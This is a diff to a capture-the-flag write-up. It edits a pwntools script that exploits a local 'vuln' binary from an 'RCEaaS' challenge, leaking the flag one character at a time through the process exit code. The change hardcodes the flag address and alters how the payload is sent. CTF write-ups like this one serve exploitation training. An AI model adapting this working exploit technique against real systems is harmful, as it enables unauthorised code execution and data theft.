@@ -206,6 +206,7 @@ rm /tmp/*.txt
 After Writing this i was known that exit code can be recoded directly Thank @zeeshan.
 
 ```python
+
 from pwn import *
 context.arch = "amd64"
 
@@ -221,15 +222,14 @@ def gen(i, flag):
 char = ""
 exit_code = 0
 
-for i in range(256):
+flag = 0x404060
+
+for i in range(30):
     io = process(["./vuln"], close_fds=False)
 
-    io.recvuntil(b'secret ')
-    flag = int(io.recvline()[:-1], 16)
-    log.info(f"flag is at: {hex(flag)}")
-
     payload = gen(i, flag)
-    io.send(payload)
+    io.sendlineafter(b'Welcome to \033[1;32mRCEaaS\033[0m\n', payload)
+    
 
     exit_code = io.poll(True)
     if exit_code < 20:
@@ -239,6 +239,11 @@ for i in range(256):
     info(f"flag is {char}")
 
     io.close()
+
+
+
+
+
 ```
 
 
